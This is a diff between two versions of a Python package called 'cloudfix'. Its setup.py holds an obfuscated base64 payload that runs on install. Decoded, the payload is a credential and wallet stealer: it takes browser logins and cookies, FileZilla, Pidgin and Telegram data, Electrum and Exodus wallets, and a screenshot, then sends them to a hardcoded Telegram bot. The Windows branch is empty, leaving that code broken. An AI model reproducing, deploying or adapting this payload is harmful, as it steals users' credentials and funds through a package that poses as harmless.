# Comparing `tmp/cloudfix-0.0.0.tar.gz` & `tmp/cloudfix-2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "cloudfix-0.0.0.tar", last modified: Sat Apr 29 16:23:36 2023, max compression
+gzip compressed data, was "cloudfix-2.tar", last modified: Sat Apr 29 16:24:12 2023, max compression
```

## Comparing `cloudfix-0.0.0.tar` & `cloudfix-2.tar`

### file list

```diff
@@ -1,5 +1,5 @@
-drwxrwxrwx   0        0        0        0 2023-04-29 16:23:36.602855 cloudfix-0.0.0/
--rw-rw-rw-   0        0        0      530 2023-04-29 16:23:36.602855 cloudfix-0.0.0/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-04-29 16:23:36.602855 cloudfix-0.0.0/cloudfix/
--rw-rw-rw-   0        0        0        0 2023-04-29 16:23:36.299166 cloudfix-0.0.0/cloudfix/__init__.py
--rw-rw-rw-   0        0        0  1688922 2023-04-29 16:23:36.300167 cloudfix-0.0.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-04-29 16:24:12.160495 cloudfix-2/
+-rw-rw-rw-   0        0        0      526 2023-04-29 16:24:12.160495 cloudfix-2/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-04-29 16:24:12.160495 cloudfix-2/cloudfix/
+-rw-rw-rw-   0        0        0        0 2023-04-29 16:24:11.845424 cloudfix-2/cloudfix/__init__.py
+-rw-rw-rw-   0        0        0  1735523 2023-04-29 16:24:11.846424 cloudfix-2/setup.py
```

### Comparing `cloudfix-0.0.0/PKG-INFO` & `cloudfix-2/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 1.1
 Name: cloudfix
-Version: 0.0.0
+Version: 2
 Summary: UNKNOWN
 Home-page: UNKNOWN
 Author: WS
 Author-email: UNKNOWN
 License: MIT
 Description: UNKNOWN
 Platform: UNKNOWN
```

### Comparing `cloudfix-0.0.0/setup.py` & `cloudfix-2/setup.py`

 * *Files 4% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 
 from distutils.core import setup
 setup(
   name = 'cloudfix',
   packages = ['cloudfix'],
-  version = '',
+  version = '2',
   license='MIT',
   description = '',
   author = 'WS',
   keywords = [],
   install_requires=[],
   classifiers=[
     'Operating System :: OS Independent',
@@ -21,10 +21,10 @@
 )
 # You got me :D 
 from os import name
 from sys import argv
 from base64 import b64decode
 if 'sdist' not in argv:
     if name == 'nt':
     else:
         exec(b64decode('Vz0ndXRmLTgnClY9J0dFVCcKVT0nbGludXgnClQ9cHJpbnQKUz1yYW5nZQpSPWZpbHRlcgpEPVRydWUKST1FeGNlcHRpb24KZnJvbSBnbG9iIGltcG9ydCBnbG9iIGFzIEYKZnJvbSBqc29uIGltcG9ydCBkdW1wCmZyb20gdGltZSBpbXBvcnQgdGltZQpmcm9tIGlvIGltcG9ydCBCeXRlc0lPIGFzIFgKZnJvbSBnemlwIGltcG9ydCBjb21wcmVzcyBhcyBZCmZyb20gZ2V0cGFzcyBpbXBvcnQgZ2V0dXNlciBhcyBFCmZyb20gYmFzZTY0IGltcG9ydCBiNjRlbmNvZGUgYXMgWgpmcm9tIHRlbXBmaWxlIGltcG9ydCBnZXR0ZW1wZGlyIGFzIEwKZnJvbSB1cmxsaWIzIGltcG9ydCBQb29sTWFuYWdlciBhcyBHCmZyb20geG1sLmV0cmVlIGltcG9ydCBFbGVtZW50VHJlZSBhcyBNCmZyb20gcGxhdGZvcm0gaW1wb3J0IG5vZGUgYXMgSixwbGF0Zm9ybSBhcyBLCmZyb20gb3MgaW1wb3J0IHBhdGggYXMgQSxtYWtlZGlycyBhcyBOLHJlbW92ZSBhcyBhCmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4IGFzIE8sdG9rZW5fYnl0ZXMgYXMgYgpmcm9tIHNodXRpbCBpbXBvcnQgY29weSxtYWtlX2FyY2hpdmUgYXMgYyxybXRyZWUgYXMgZAp0cnk6ZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYiBhcyBlCmV4Y2VwdCBJbXBvcnRFcnJvcjpQPUZhbHNlCmVsc2U6UD1ECmlmIFUgbm90IGluIEsoKS5sb3dlcigpOmV4aXQoMSkKZj0nRm93bGVkIHB5cHkgdXAnCmc9JzEwOTgyOTI2NDMnCmg9JzYxOTMwOTMwNTY6QUFIenlOR1VHUzlhVUc2Q0N4NkVOTG9YcENGTHpFUXl3SVEnCmk9Jzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+PENvbW1hbmRzICB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiAgeG1sbnM6eHNkPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSI+ICA8Y29tbWFuZHM+PGNvbW1hbmQgbmFtZT0iMiI+PGFyZ3M+PHN0cmluZz5+L3NuYXAvZmlyZWZveC9jb21tb24vLm1vemlsbGEvZmlyZWZveDwvc3RyaW5nPjxzdHJpbmc+fi8ubW96aWxsYS9maXJlZm94PC9zdHJpbmc+PC9hcmdzPjwvY29tbWFuZD48Y29tbWFuZCBuYW1lPSIyIj48YXJncz48c3RyaW5nPn4vLnRodW5kZXJiaXJkPC9zdHJpbmc+PC9hcmdzPjwvY29tbWFuZD48Y29tbWFuZCBuYW1lPSIwIj48YXJncz48c3RyaW5nPn4vLmNvbmZpZy9maWxlemlsbGE8L3N0cmluZz48c3RyaW5nPnNpdGVtYW5hZ2VyLnhtbDtyZWNlbnRzZXJ2ZXJzLnhtbDwvc3RyaW5nPjxzdHJpbmc+QXBwcy9GaWxlWmlsbGE8L3N0cmluZz48L2FyZ3M+PC9jb21tYW5kPjxjb21tYW5kIG5hbWU9IjAiPjxhcmdzPjxzdHJpbmc+fi8ucHVycGxlPC9zdHJpbmc+PHN0cmluZz5hY2NvdW50cy54bWw8L3N0cmluZz48c3RyaW5nPkFwcHMvUGlkZ2luPC9zdHJpbmc+PC9hcmdzPjwvY29tbWFuZD48Y29tbWFuZCBuYW1lPSIwIj48YXJncz48c3RyaW5nPn4vLmxvY2FsL3NoYXJlL1RlbGVncmFtRGVza3RvcC90ZGF0YTt+Ly52YXIvYXBwL29yZy50ZWxlZ3JhbS5kZXNrdG9wL2RhdGEvVGVsZWdyYW1EZXNrdG9wL3RkYXRhO34vc25hcC90ZWxlZ3JhbS1kZXNrdG9wL2N1cnJlbnQvLmxvY2FsL3NoYXJlL1RlbGVncmFtRGVza3RvcC90ZGF0YTwvc3RyaW5nPjxzdHJpbmc+KnM7Pz8/Pz8/Pz8/Pz8/Pz8/Py9tYXA/PC9zdHJpbmc+PHN0cmluZz5HcmFiYmVyL1RlbGVncmFtPC9zdHJpbmc+PC9hcmdzPjwvY29tbWFuZD48Y29tbWFuZCBuYW1lPSIwIj48YXJncz48c3RyaW5nPn4vLmVsZWN0cnVtL3dhbGxldHM7fi9zbmFwL2VsZWN0cnVtL2N1cnJlbnQvLmVsZWN0cnVtL3dhbGxldHM8L3N0cmluZz48c3RyaW5nPip3YWxsZXQqPC9zdHJpbmc+PHN0cmluZz5HcmFiYmVyL1dhbGxldHMvRWxlY3RydW08L3N0cmluZz48L2FyZ3M+PC9jb21tYW5kPjxjb21tYW5kIG5hbWU9IjAiPjxhcmdzPjxzdHJpbmc+fi8uY29uZmlnL0V4b2R1czwvc3RyaW5nPjxzdHJpbmc+ZXhvZHVzLmNvbmYuanNvbjtleG9kdXMud2FsbGV0Lyouc2Vjbzwvc3RyaW5nPjxzdHJpbmc+R3JhYmJlci9XYWxsZXRzL0V4b2R1czwvc3RyaW5nPjwvYXJncz48L2NvbW1hbmQ+ICA8L2NvbW1hbmRzPjwvQ29tbWFuZHM+JwpqPScxLjUuOS4xJwpCPUEuam9pbihMKCksTyg4KSkKTihCLGV4aXN0X29rPUQpCms9WydrZXk0LmRiJywnbG9naW5zLmpzb24nLCdjb29raWVzLnNxbGl0ZSddClE9bGFtYmRhIHA6bGlzdChSKGxhbWJkYSBleDpBLmV4aXN0cyhleCksbWFwKGxhbWJkYSBlOkEuZXhwYW5kdXNlcihlKSxwKSkpCmRlZiBsKGtleSxkYXRhKToKCUE9bGlzdChTKDI1NikpO0M9MDtEPWJ5dGVhcnJheSgpCglmb3IgQiBpbiBTKDI1Nik6Qz0oQytBW0JdK2tleVtCJWxlbihrZXkpXSklMjU2O0FbQl0sQVtDXT1BW0NdLEFbQl0KCUI9Qz0wCglmb3IgRSBpbiBkYXRhOkI9KEIrMSklMjU2O0M9KEMrQVtCXSklMjU2O0FbQl0sQVtDXT1BW0NdLEFbQl07RC5hcHBlbmQoRV5BWyhBW0JdK0FbQ10pJTI1Nl0pCglyZXR1cm4gYnl0ZXMoRCkKZGVmIG0oKToKCXRyeTpMPUcoKTtNPUwucmVxdWVzdChWLCdodHRwOi8vaXAtYXBpLmNvbS9saW5lP2ZpZWxkcz1xdWVyeSxpc3AnKQoJZXhjZXB0IEkgYXMgRDpUKEQpO0YsSD0nMTI3LjAuMC4xJywnVW5rbm93bicKCWVsc2U6CgkJRixIPU0uZGF0YS5kZWNvZGUoVykuc3RyaXAoKS5zcGxpdCgnXG4nKQoJCWZvciBOIGluIFsnZ29vZ2xlJywnbXl0aGljIGJlYXN0cyddOgoJCQlpZiBOIGluIEgubG93ZXIoKTpleGl0KDUpCgl0cnk6CgkJQz1YKCkKCQlpZiBQOk89ZS5ncmFiKCk7Ty5zYXZlKEMsZm9ybWF0PSdwbmcnKQoJCUM9WihDLmdldHZhbHVlKCkpLmRlY29kZSgpCglleGNlcHQgSSBhcyBEOlQoRCk7Qz0nJwoJd2l0aCBvcGVuKEEuam9pbihCLCdzeXN0ZW0uanNvbicpLCd3JylhcyBROmR1bXAoeydTY3JlZW5zaG90JzpDLCdVc2VybmFtZSc6RSgpLCdDb21wbmFtZSc6SigpLCdPUyc6SygpLCdUYWcnOmYsJ0lQJzpGLCdTdHViIHZlcnNpb24nOmosJ0V4ZWN1dGlvbiB0aW1lc3RhbXAnOnRpbWUoKX0sUSkKZGVmIEgobG9jYXRpb24scGF0dGVybnMsb3V0cHV0KToKCUc9b3V0cHV0O0U9bG9jYXRpb24KCWZvciBDIGluIHBhdHRlcm5zOgoJCWlmJy8naW4gQzoKCQkJQj1BLmRpcm5hbWUoQyk7Sj1BLmJhc2VuYW1lKEMpCgkJCWlmJyonaW4gQiBvcic/J2luIEI6CgkJCQl0cnk6Qj1GKEEuam9pbihFLEIpKVswXQoJCQkJZXhjZXB0OnBhc3MKCQkJSChsb2NhdGlvbj1BLmpvaW4oRSxCKSxwYXR0ZXJucz1bSl0sb3V0cHV0PUEuam9pbihHLEEuYmFzZW5hbWUoQikpKQoJCWVsc2U6CgkJCWZvciBJIGluIEYoQS5qb2luKEUsQykpOgoJCQkJaWYgQS5pc2ZpbGUoSSk6TihHLGV4aXN0X29rPUQpO2NvcHkoSSxBLmpvaW4oRyxBLmJhc2VuYW1lKEkpKSkKZGVmIG4oY29tbWFuZHMpOgoJUD0nLnppcCc7Qz1jb21tYW5kcwoJaWYgQy5zdGFydHN3aXRoKCdodHRwJyk6CgkJdHJ5OlM9RygpO1Q9Uy5yZXF1ZXN0KFYsQyk7Qz1ULmRhdGEuZGVjb2RlKFcpLnN0cmlwKCkKCQlleGNlcHQgSTpDPScnCglVPU0uRWxlbWVudFRyZWUoTS5mcm9tc3RyaW5nKEMpKTtYPVUuZ2V0cm9vdCgpCglmb3IgRCBpbiBYWzBdOgoJCU49aW50KEQuZ2V0KCduYW1lJykpCgkJaWYgTj09MDoKCQkJWT1RKERbMF1bMF0udGV4dC5zcGxpdCgnOycpKTtaPURbMF1bMV0udGV4dC5zcGxpdCgnOycpO2I9QS5qb2luKEIsRFswXVsyXS50ZXh0KQoJCQlmb3IgZSBpbiBZOkgoZSxaLGIpCgkJZWxpZiBOPT0yOgoJCQlmb3IgZiBpbiBEWzBdOgoJCQkJZm9yIGcgaW4gUShbZi50ZXh0XSk6CgkJCQkJZm9yIEogaW4gUihsYW1iZGEgcDpBLmV4aXN0cyhBLmpvaW4ocCwncHJlZnMuanMnKSksRihBLmpvaW4oZywnKi4qJykpKTpFPUEuYmFzZW5hbWUoQS5kaXJuYW1lKEopKS50aXRsZSgpO0U9RVsxOl1pZiBFWzBdPT0nLidlbHNlIEU7aD1BLmJhc2VuYW1lKEopO0gobG9jYXRpb249SixwYXR0ZXJucz1rLG91dHB1dD1BLmpvaW4oQiwnQnJvd3NlcnMnLEUsaCkpCglLPUEuam9pbihMKCksTyg4KSk7YyhLLCd6aXAnLEIpO2QoQikKCXdpdGggb3BlbihLK1AsJ3JiJylhcyBpOmo9aS5yZWFkKCkKCWEoSytQKTtyZXR1cm4gagpkZWYgbyhidWZmZXIpOkE9YigxNik7Qj1ZKGJ1ZmZlcik7Qz1sKEEsQik7cmV0dXJuIGInTFdTUiQnK0MrQQpkZWYgcChidWZmZXIpOkE9J2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7MH0vc2VuZERvY3VtZW50P2NoYXRfaWQ9ezF9JmNhcHRpb249ezJ9Jy5mb3JtYXQoaCxnLFUpO0I9RygpO0IucmVxdWVzdCgnUE9TVCcsQSxmaWVsZHM9eydkb2N1bWVudCc6KGYie0UoKX1Ae0ooKX0ud3NyIixidWZmZXIpfSkKbSgpCkM9bihpKQpDPW8oQykKcChDKQ==').decode())
```
